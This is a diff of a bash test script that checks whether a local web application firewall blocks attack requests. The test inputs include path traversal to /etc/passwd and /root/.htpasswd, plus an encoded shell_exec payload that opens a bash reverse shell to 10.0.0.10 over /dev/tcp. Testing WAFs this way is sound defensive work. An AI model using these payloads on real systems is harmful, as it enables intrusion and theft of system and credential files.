@@ -1,6 +1,6 @@
 #/bin/bash
 echo "[ ] Checking if our WAF is up."
-for I in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
+for I in 1 2 3 4 5 6 7 8 9 10
 do
 	http_code=$(curl "http://localhost:81/SomeFile.php?SomeParam=HelloWorld" -s -f -w %{http_code} -m 1 -o /dev/null)
 	if (($http_code == 404)); then 
@@ -8,43 +8,43 @@ do
 		break
   	fi
 	echo "    [!] We got a $http_code. Our WAF seems to be down. Check $I out of 20"; 
-	sleep 1s
+	sleep 0.5
 	if (($I == 5)); then
 		echo "[ ] 	"	
 		echo "    [!] Check counter $I out of 20. Killing test."; 		
-		exit 100; 
+		exit 10; 
 	fi	
 done
 echo "[x] Our WAF is up!"; 
-echo "[ ] Checking Path Traversal"
+echo "[ ] Running WAF Tests"
+echo "    [ ] Path Traversal"
 path_traversal01_http_code=$(curl "http://localhost:81/SomeFile.pl?SomeParam=../../../etc/passwd" -s -f -w %{http_code} -m 10 -o /dev/null)
 if (($path_traversal01_http_code == 403)); then 
-	echo "    [+] We got a $path_traversal01_http_code on Path Traversal #01." ; 
+	echo "        [+] Path Traversal - We got a $path_traversal01_http_code on Path Traversal #01." ; 
 else 
-	echo "    [!] We got a $path_traversal01_http_code on Path Traversal #01.";
-	echo "[!] Our WAF did NOT block all Path Traversal requests :("; 
-	exit 201; 
+	echo "        [!] Path Traversal - We got a $path_traversal01_http_code on Path Traversal #01.";
+	echo "[!] Path Traversal - Our WAF did NOT block all requests :("; 
+	exit 21; 
 fi
 path_traversal02_http_code=$(curl "http://localhost:81/SomeFile.asp?SomeParam=SomeValue" -H 'Cookie: PHPSESSID%3D%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2froot%2F%2ehtpasswd' -s -f -w %{http_code} -m 10 -o /dev/null)
 if (($path_traversal02_http_code == 403)); then 
-	echo "    [+] We got a $path_traversal02_http_code on Path Traversal #02." ; 
+	echo "        [+] We got a $path_traversal02_http_code on Path Traversal #02." ; 
 else 
-	echo "    [!] We got a $path_traversal02_http_code on Path Traversal #02.";
-	echo "[!] Our WAF did NOT block all Path Traversal requests :("; 
-	exit 202; 
+	echo "        [!] We got a $path_traversal02_http_code on Path Traversal #02.";
+	echo "[!] Path Traversal - Our WAF did NOT block all requests :("; 
+	exit 22; 
 fi
 echo "[x] Our WAF blocked all Path Traversal requests, Noice!"
-echo "[ ] Checking Shell Exec"
+echo "    [ ] Shell Exec"
 shell_exec_http_code=$(curl "http://localhost:81/SomeFile.php?SomeParam=shell_exec%28%22%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.10%2F1234%200%3E%261%27%22%29" -s -f -w %{http_code} -m 10 -o /dev/null)
 if (($shell_exec_http_code == 403)); then 
-	echo "    [+] We got a $shell_exec_http_code on Shell Exec #01.";
+	echo "        [+] Shell Exec - We got a $shell_exec_http_code on Shell Exec #01.";
 else 
-	echo "    [!] We got a $shell_exec_http_code on Shell Exec #01."; 
-	echo "[x] Our WAF did NOT block the request :(";	
-	exit 210; 
+	echo "        [!] Shell Exec - We got a $shell_exec_http_code on Shell Exec #01."; 
+	echo "[!] Shell Exec - Our WAF did NOT block all requests :("; 
+	exit 31; 
 fi
-echo "[x] Our WAF blocked all Shell Exec requests, Noice!"
-echo ""
-echo "[x] All tests succeded !"
+echo "    [x] Our WAF blocked all Shell Exec requests, Noice!"
+echo "[x] All WAF tests succeded!"
 echo ""
 echo ""
